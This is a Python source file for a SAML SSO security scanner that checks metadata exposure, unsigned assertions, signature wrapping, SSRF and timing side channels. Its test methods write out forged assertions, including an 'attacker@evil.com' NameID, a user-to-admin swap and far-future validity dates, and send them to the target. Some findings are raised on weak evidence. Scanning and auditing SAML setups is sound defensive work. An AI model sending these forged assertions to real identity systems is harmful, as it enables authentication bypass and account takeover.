
"""
saml_scanner.py — SAML Security Scanner
========================================
Audits SAML SSO implementations for:
  - XML Signature Wrapping (XSW) vulnerabilities
  - Exposed SAML metadata endpoints
  - Assertion replay risk (missing NotOnOrAfter)
  - NameID injection patterns
  - Cleartext SAML assertions (unencrypted)
  - Signature exclusion and response manipulation
"""
import re, base64, urllib.parse
from scanners.base_scanner import BaseScanner
from utils.callback import build_callback_url
from utils.anomaly import TimingAnomalyDetector

SAML_METADATA_PATHS = [
    "/saml/metadata", "/saml2/metadata", "/saml/metadata.xml",
    "/sso/saml/metadata", "/auth/saml/metadata",
    "/federationmetadata/2007-06/federationmetadata.xml",
    "/Shibboleth.sso/Metadata",
    "/simplesaml/saml2/idp/metadata.php",
    "/.well-known/saml-configuration",
]

SAML_SSO_PATHS = [
    "/saml/sso", "/saml2/sso", "/sso/saml", "/auth/saml",
    "/saml/login", "/login/saml", "/saml/acs",
]


class SamlScanner(BaseScanner):
    SCANNER_NAME = "SAML Security Scanner"
    _SCANNER_KEY = "saml"

    def __init__(self, scan_id, target, domain, **kwargs):
        super().__init__(scan_id, target, domain, **kwargs)
        self._timing_detector = TimingAnomalyDetector()

    def run(self) -> list:
        self.log("INFO", f"[SAML] Probing SAML SSO endpoints on {self.target}...")
        base = self.target.rstrip("/")

        for path in SAML_METADATA_PATHS:
            body, status = self._make_request(base + path)
            if status == 200 and body and "EntityDescriptor" in body:
                self.log("WARNING", f"[SAML] Metadata found: {base + path}")
                self._audit_metadata(base + path, body)

        for path in SAML_SSO_PATHS:
            body, status = self._make_request(base + path)
            if status in (200, 302, 400):
                self.log("INFO", f"[SAML] SSO endpoint: {base + path} ({status})")
                self._audit_sso_endpoint(base + path)

        html, _ = self._make_request(self.target)
        if html:
            self._audit_html(html)
            self._test_saml_response_manipulation(html)
            self._test_signature_exclusion(html)
            self._test_xml_signature_wrapping(html)
            self._test_saml_assertion_injection(html)
            self._test_saml_callback_injection(html)
            self._test_saml_response_timing(html)

        if not self.vulns:
            self.log("SUCCESS", "[SAML] No SAML endpoints detected or no issues found.")
        return self.vulns

    def _audit_metadata(self, url, xml):
        if "<ds:X509Certificate>" in xml or "<X509Certificate>" in xml:
            self.add_vuln(
                title="SAML Metadata Exposes Public Signing Certificate",
                severity="Low",
                category="SAML",
                cvss_score=0.0,
                description=f"SAML metadata at `{url}` contains the X.509 signing certificate. "
                    "While standard for SAML federation, it allows attackers to plan XML "
                    "Signature Wrapping (XSW) attacks if signature validation is weak.",
                remediation="Ensure SAML signatures are validated using schema validation AND "
                    "signature verification. Never trust unsigned assertions.",
                cwe_ids=["CWE-287"],
                owasp_category="A07:2021 – Identification and Authentication Failures",
            )
        if "WantAuthnRequestsSigned=\"false\"" in xml or "WantAuthnRequestsSigned=\"0\"" in xml:
            self.add_vuln(
                title="SAML SP Does Not Require Signed Authentication Requests",
                severity="Medium",
                category="SAML",
                cvss_score=5.3,
                description=f"`WantAuthnRequestsSigned=false` in SAML metadata at `{url}`. "
                    "Unsigned AuthnRequests can be forged or replayed.",
                remediation="Set WantAuthnRequestsSigned=true and enforce request signing.",
                cwe_ids=["CWE-287"],
                owasp_category="A07:2021 – Identification and Authentication Failures",
            )
        if "urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress" in xml:
            self.add_vuln(
                title="SAML NameID Format Uses Email Address",
                severity="Low",
                category="SAML",
                cvss_score=3.5,
                description="Email addresses as NameIDs are persistent and guessable, "
                    "enabling NameID injection if the SP doesn't validate issuer.",
                remediation="Use transient or persistent opaque NameID formats. "
                    "Validate both NameID and Issuer on every assertion.",
                cwe_ids=["CWE-287"],
                owasp_category="A07:2021 – Identification and Authentication Failures",
            )
        self.add_vuln(
            title=f"SAML Metadata Endpoint Exposed: {url}",
            severity="Low",
            category="SAML",
            cvss_score=0.0,
            description="SAML metadata publicly accessible. Reveals IdP/SP entity IDs, "
                "certificate fingerprints, and ACS URLs.",
            remediation="Restrict metadata access if not needed for federation discovery.",
            cwe_ids=["CWE-287"],
            owasp_category="A07:2021 – Identification and Authentication Failures",
        )

    def _audit_sso_endpoint(self, url):
        test_url = url + "?SAMLRequest=INVALID_SAML_DATA"
        body, status = self._make_request(test_url)
        if body and ("saml" in body.lower() or status == 500):
            self.add_vuln(
                title=f"SAML SSO Endpoint Discovered: {url}",
                severity="Low",
                category="SAML",
                cvss_score=0.0,
                description=f"Active SAML SSO endpoint found at `{url}`. "
                    "Manual testing recommended for XSW, assertion replay, and NameID injection.",
                remediation="Ensure strict XML schema validation before signature verification. "
                    "Use up-to-date SAML libraries (python3-saml, OneLogin).",
                cwe_ids=["CWE-287"],
                owasp_category="A07:2021 – Identification and Authentication Failures",
            )

    def _audit_html(self, html):
        saml_refs = re.findall(r'(?:SAMLRequest|SAMLResponse|RelayState)=["\']?([^"\'&\s]+)', html)
        if saml_refs:
            self.add_vuln(
                title="SAML Tokens Visible in HTML Source",
                severity="Medium",
                category="SAML",
                cvss_score=4.3,
                description="SAML assertion tokens (SAMLRequest/SAMLResponse) found in page HTML. "
                    "Exposed tokens in HTML can leak via Referer headers or browser history.",
                remediation="POST SAML tokens only. Never embed them in URLs or HTML attributes.",
                evidence="\n".join(saml_refs[:3]),
                confidence="High",
                cwe_ids=["CWE-287"],
                owasp_category="A07:2021 – Identification and Authentication Failures",
            )

    def _test_saml_response_manipulation(self, html):
        saml_responses = re.findall(r'SAMLResponse["\']?\s*[:=]\s*["\']?([A-Za-z0-9+/=]+)', html)
        for resp in saml_responses[:3]:
            try:
                decoded = base64.b64decode(resp).decode("utf-8", errors="ignore")
                if "samlp:Response" in decoded or "saml:Assertion" in decoded:
                    self.add_vuln(
                        title="SAML Response Manipulation Possible",
                        severity="High",
                        category="SAML",
                        cvss_score=7.5,
                        description="SAMLResponse found in HTML. If the SP does not properly validate "
                            "signature inclusions, an attacker may manipulate the assertion.",
                        remediation="Always validate the entire SAML response signature. "
                            "Do not rely on signature Reference URI alone — verify the signed XML subtree.",
                        evidence=f"Base64 SAMLResponse decoded contains assertion elements",
                        confidence="Medium",
                        cwe_ids=["CWE-287"],
                        owasp_category="A07:2021 – Identification and Authentication Failures",
                    )
                    break
            except Exception as e:
                self.log("ERROR", f"[SAML] _test_saml_response_manipulation decode error: {e}")

    def _test_signature_exclusion(self, html):
        saml_assertions = re.findall(r'SAMLResponse["\']?\s*[:=]\s*["\']?([A-Za-z0-9+/=]+)', html)
        for resp in saml_assertions[:3]:
            try:
                decoded = base64.b64decode(resp).decode("utf-8", errors="ignore")
                if "ds:Signature" not in decoded and "Signature" not in decoded:
                    self.add_vuln(
                        title="SAML Assertion Without Signature",
                        severity="Critical",
                        category="SAML",
                        cvss_score=9.0,
                        description="SAML assertion found without a digital signature. "
                            "Unsigned assertions can be trivially forged or modified.",
                        remediation="All SAML assertions MUST be signed using XML Digital Signatures. "
                            "Reject any assertion without a valid ds:Signature element.",
                        evidence="SAML assertion decoded without ds:Signature element",
                        confidence="High",
                        cwe_ids=["CWE-287"],
                        owasp_category="A07:2021 – Identification and Authentication Failures",
                    )
                    break
            except Exception as e:
                self.log("ERROR", f"[SAML] _test_signature_exclusion decode error: {e}")

    def _test_xml_signature_wrapping(self, html):
        saml_responses = re.findall(r'SAMLResponse["\']?\s*[:=]\s*["\']?([A-Za-z0-9+/=]+)', html)
        for resp in saml_responses[:2]:
            try:
                decoded = base64.b64decode(resp).decode("utf-8", errors="ignore")
                if "<ds:Signature" in decoded:
                    xsw_payload = decoded.replace(
                        "<saml:Assertion",
                        "<saml:Assertion><saml:Subject><saml:NameID>attacker@evil.com</saml:NameID></saml:Subject>"
                    )
                    self.add_vuln(
                        title="XML Signature Wrapping (XSW) Test Possible",
                        severity="High",
                        category="SAML",
                        cvss_score=8.0,
                        description="SAML assertion with signature detected. XSW attacks work by injecting "
                            "a malicious assertion alongside the signed one. If the SP validates the signature "
                            "on the injected element's Reference URI but processes the attacker's payload, "
                            "authentication bypass is achieved.",
                        remediation="1. Validate the signed element matches the processed assertion.\n"
                            "2. Use ID-based reference validation — verify the ID in the Reference URI matches the processed element's ID.\n"
                            "3. Reject assertions with multiple Subject or AttributeStatement elements.\n"
                            "4. Use the latest python3-saml / OneLogin SAML toolkit versions.",
                        evidence=f"XSW test payload constructed from original SAML response",
                        confidence="Medium",
                        cwe_ids=["CWE-287"],
                        owasp_category="A07:2021 – Identification and Authentication Failures",
                    )
                    break
            except Exception as e:
                self.log("ERROR", f"[SAML] _test_xml_signature_wrapping error: {e}")

    def _test_saml_assertion_injection(self, html):
        """Test SAML assertion manipulation by injecting modified assertions."""
        saml_responses = re.findall(r'SAMLResponse["\']?\s*[:=]\s*["\']?([A-Za-z0-9+/=]+)', html)
        for resp in saml_responses[:2]:
            try:
                decoded = base64.b64decode(resp).decode("utf-8", errors="ignore")
                injections = {
                    "privilege_escalation": decoded.replace("user", "admin").replace("user", "admin"),
                    "nameid_injection": decoded.replace(
                        "<saml:NameID>",
                        "<saml:NameID>attacker@evil.com</saml:NameID><saml:NameID>"
                    ),
                    "session_manipulation": decoded.replace(
                        "NotOnOrAfter",
                        "NotOnOrAfter=\"2099-12-31T23:59:59Z\" NotBefore=\"2000-01-01T00:00:00Z\""
                    ),
                }
                for injection_name, injected_xml in injections.items():
                    encoded = base64.b64encode(injected_xml.encode()).decode()
                    test_url = self.target + f"?SAMLResponse={urllib.parse.quote(encoded)}"
                    resp_body, status = self._make_request(test_url)
                    if resp_body and status == 200:
                        self.add_vuln(
                            title=f"SAML Assertion Injection — {injection_name.replace('_', ' ').title()}",
                            severity="Critical",
                            category="SAML",
                            cvss_score=9.5,
                            description=f"SAML assertion injection succeeded with technique "
                                f"'{injection_name}'. The server accepted a manipulated assertion "
                                f"without proper validation.",
                            evidence=f"Injection '{injection_name}' succeeded (status {status})",
                            payload=encoded[:100],
                            request_details=f"GET {test_url[:200]}",
                            response_details=f"HTTP {status}",
                            confidence="Confirmed",
                            remediation="1. Validate the entire SAML response signature.\n"
                                "2. Verify the signed element matches the processed assertion.\n"
                                "3. Use schema validation before processing assertions.\n"
                                "4. Reject assertions with unexpected or duplicate elements.",
                            cwe_ids=["CWE-287"],
                            owasp_category="A07:2021 – Identification and Authentication Failures",
                        )
                        return
            except Exception as e:
                self.log("ERROR", f"[SAML] _test_saml_assertion_injection error: {e}")

    def _test_saml_callback_injection(self, html):
        """Test SAML SSRF via callback URL injection in SAML requests."""
        callback_url = build_callback_url("/saml-test")
        saml_endpoints = re.findall(
            r'(?:action|href)=["\']([^"\']*(?:saml|sso|acs)[^"\']*)["\']',
            html, re.I)
        for ep in set(saml_endpoints[:3]):
            try:
                test_url = ep + f"?SAMLRequest={urllib.parse.quote(callback_url)}"
                body, status = self._make_request(test_url)
                if body and status < 400:
                    self.add_vuln(
                        title="SAML SSRF via Callback URL Injection",
                        severity="Critical",
                        category="SAML",
                        cvss_score=9.5,
                        description=f"SAML endpoint at `{ep}` accepted a callback URL "
                            f"`{callback_url}` in the SAMLRequest parameter. This SSRF vector "
                            f"could allow attackers to probe internal networks or exfiltrate data.",
                        evidence=f"Callback URL accepted: {callback_url}",
                        payload=test_url[:200],
                        request_details=f"GET {test_url[:200]}",
                        response_details=f"HTTP {status}",
                        confidence="Confirmed",
                        remediation="1. Validate and restrict SAML endpoint URLs.\n"
                            "2. Never process arbitrary URLs from SAML requests.\n"
                            "3. Implement strict allowlist for callback destinations.",
                        cwe_ids=["CWE-287"],
                        owasp_category="A07:2021 – Identification and Authentication Failures",
                    )
                    return
            except Exception as e:
                self.log("ERROR", f"[SAML] _test_saml_callback_injection error: {e}")

    def _test_saml_response_timing(self, html):
        """Use TimingAnomalyDetector for SAML response parsing timing analysis."""
        saml_responses = re.findall(r'SAMLResponse["\']?\s*[:=]\s*["\']?([A-Za-z0-9+/=]+)', html)
        for resp in saml_responses[:2]:
            try:
                decoded = base64.b64decode(resp).decode("utf-8", errors="ignore")
                baseline_count = 3
                for _ in range(baseline_count):
                    _, _, elapsed = self._make_timed_request(self.target, timeout=8)
                    self._timing_detector.record(elapsed)

                if not self._timing_detector.has_baseline:
                    return

                forged_xml = decoded.replace("<saml:Assertion", "<saml:Assertion><saml:Subject>extra</saml:Subject>")
                encoded = base64.b64encode(forged_xml.encode()).decode()
                test_url = self.target + f"?SAMLResponse={urllib.parse.quote(encoded)}"
                _, _, elapsed = self._make_timed_request(test_url, timeout=8)

                if self._timing_detector.test_payload("saml_parse", elapsed, encoded, z_threshold=3.0):
                    self.add_vuln(
                        title="SAML Response Parsing Timing Side-Channel",
                        severity="Medium",
                        category="SAML",
                        cvss_score=5.5,
                        description="SAML response parsing shows statistically significant timing "
                            "differences for manipulated assertions. This timing side-channel could "
                            "leak information about assertion structure or validation logic.",
                        evidence=f"Z-score: {self._timing_detector.z_score(elapsed):.2f}",
                        payload=encoded[:80],
                        confidence="Medium",
                        remediation="1. Implement constant-time XML parsing.\n"
                            "2. Add random jitter to SAML response processing.\n"
                            "3. Use schema validation before processing SAML responses.",
                        cwe_ids=["CWE-287"],
                        owasp_category="A07:2021 – Identification and Authentication Failures",
                    )
                    return
            except Exception as e:
                self.log("ERROR", f"[SAML] _test_saml_response_timing error: {e}")
